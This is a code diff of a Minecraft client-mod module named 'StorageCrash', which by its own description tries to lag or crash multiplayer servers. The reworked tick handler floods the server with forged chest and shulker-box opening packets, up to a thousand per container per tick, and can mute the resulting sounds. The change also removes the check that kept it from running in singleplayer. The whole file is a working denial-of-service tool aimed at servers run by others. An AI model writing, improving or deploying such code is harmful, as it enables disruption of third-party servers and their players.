@@ -5,11 +5,15 @@ import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
 import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
-import meteordevelopment.meteorclient.settings.*;
+import meteordevelopment.meteorclient.settings.BoolSetting;
+import meteordevelopment.meteorclient.settings.IntSetting;
+import meteordevelopment.meteorclient.settings.Setting;
+import meteordevelopment.meteorclient.settings.SettingGroup;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.meteorclient.utils.world.BlockIterator;
 import meteordevelopment.orbit.EventHandler;
-import net.minecraft.block.*;
+import net.minecraft.block.AbstractChestBlock;
+import net.minecraft.block.ShulkerBoxBlock;
 import net.minecraft.client.gui.screen.ingame.AbstractInventoryScreen;
 import net.minecraft.client.gui.screen.ingame.HandledScreen;
 import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
@@ -19,114 +23,85 @@ import net.minecraft.util.math.Direction;
 import net.minecraft.util.math.Vec3d;
 import org.lwjgl.glfw.GLFW;
 
-import java.util.Objects;
-
 public class StorageCrash extends Module {
+    private final SettingGroup sgGeneral = settings.getDefaultGroup();
 
-    private final Setting<Integer> amount;
-
-    private final Setting<Boolean> noSound;
-
-    private final Setting<Boolean> autoDisable;
-
-    private final Setting<Boolean> insideBlock;
-
-    private final Setting<Integer> sequence;
-
-    public StorageCrash() {
-        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Storage Crash", "CRYSTAL || Attempts to lag / crash servers by sending broken storage opening packets.");
-
-        SettingGroup sgGeneral = settings.getDefaultGroup();
-
-        amount = sgGeneral.add(new IntSetting.Builder()
+    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
             .name("amount")
             .description("How many packets to send to the server per container block per tick.")
             .defaultValue(100)
             .min(1)
+            .sliderMin(1)
             .sliderMax(1000)
-            .build());
-        noSound = sgGeneral.add(new BoolSetting.Builder()
+            .build()
+    );
+
+    private final Setting<Boolean> noSound = sgGeneral.add(new BoolSetting.Builder()
             .name("no-sound")
             .description("Blocks the noisy container opening/closing sounds.")
             .defaultValue(false)
-            .build());
-        autoDisable = sgGeneral.add(new BoolSetting.Builder()
-            .name("Auto Disable")
+            .build()
+    );
+
+    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
+            .name("auto-disable")
             .description("Disables module on kick.")
             .defaultValue(true)
-            .build());
-        insideBlock = sgGeneral.add(new BoolSetting.Builder()
-            .name("InsideBlock")
-            .description("Choose InsideBlock.")
-            .defaultValue(false)
-            .build());
-        sequence = sgGeneral.add(new IntSetting.Builder()
-            .name("Sequence")
+            .build()
+    );
+
+    private final Setting<Integer> sequence = sgGeneral.add(new IntSetting.Builder()
+            .name("sequence")
             .description("Choose the sequence")
             .defaultValue(0)
             .min(0)
             .sliderMin(0)
             .sliderMax(1000)
-            .build());
+            .build()
+    );
+
+    public StorageCrash() {
+        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "storage-crash", "CRYSTAL || Attempts to lag / crash servers by sending broken storage opening packets.");
     }
 
     @EventHandler
     private void onTick(TickEvent.Pre event) {
-        if(!mc.isInSingleplayer()) {
-            if (GLFW.glfwGetKey(mc.getWindow().getHandle(), GLFW.GLFW_KEY_ESCAPE) == GLFW.GLFW_PRESS) {
-                toggle();
-                assert mc.player != null;
-                mc.player.closeHandledScreen();
-            }
-
-            BlockIterator.register(4, 4, ((blockPos, blockState) -> {
-                Block block = blockState.getBlock();
-                if (block instanceof AbstractChestBlock || block instanceof ShulkerBoxBlock) {
-
-                    BlockHitResult bhr = new BlockHitResult(new Vec3d(blockPos.getX(), blockPos.getY(), blockPos.getZ()), Direction.DOWN, blockPos, insideBlock.get());
-                    PlayerInteractBlockC2SPacket openPacket = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, sequence.get());
-
-                    int i = 0;
-                    while (true) {
-                        if (i < amount.get()) {
-                            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(openPacket);
-                            i++;
-                        } else {
-                            break;
-                        }
-                    }
-                }
-            }));
-        } else {
-            error("You must be on a server, toggling.");
+        if (GLFW.glfwGetKey(mc.getWindow().getHandle(), GLFW.GLFW_KEY_ESCAPE) == GLFW.GLFW_PRESS) {
             toggle();
+            mc.player.closeHandledScreen();
+            return;
         }
+        BlockIterator.register(4, 4, ((blockPos, blockState) -> {
+            if (blockState.getBlock() instanceof AbstractChestBlock || blockState.getBlock() instanceof ShulkerBoxBlock) {
+                for (int i = 0; i < amount.get(); i++)
+                    mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
+                            Hand.MAIN_HAND,
+                            new BlockHitResult(new Vec3d(
+                                    blockPos.getX(),
+                                    blockPos.getY(),
+                                    blockPos.getZ()),
+                                    Direction.DOWN,
+                                    blockPos,
+                                    false),
+                            sequence.get()));
+            }
+        }));
     }
 
     @EventHandler
     private void onScreenOpen(OpenScreenEvent event) {
-        if (event.screen != null) {
-            if (mc.isPaused() || event.screen instanceof AbstractInventoryScreen || (!(event.screen instanceof HandledScreen))) {
-                return;
-            }
-            event.setCancelled(true);
-        }
+        if (event.screen == null) return;
+        if (!event.screen.shouldPause() && !(event.screen instanceof AbstractInventoryScreen) && (event.screen instanceof HandledScreen)) event.setCancelled(true);
     }
 
     @EventHandler
     private void onGameLeft(GameLeftEvent event) {
-        if (!autoDisable.get()) {
-            return;
-        }
-        toggle();
+        if (autoDisable.get()) toggle();
     }
 
     @EventHandler
     private void onPlaySound(PlaySoundEvent event) {
-        if (!noSound.get() || !shouldCancel(event)) {
-            return;
-        }
-        event.cancel();
+        if (noSound.get() && shouldCancel(event)) event.setCancelled(true);
     }
 
     private boolean shouldCancel(PlaySoundEvent event) {
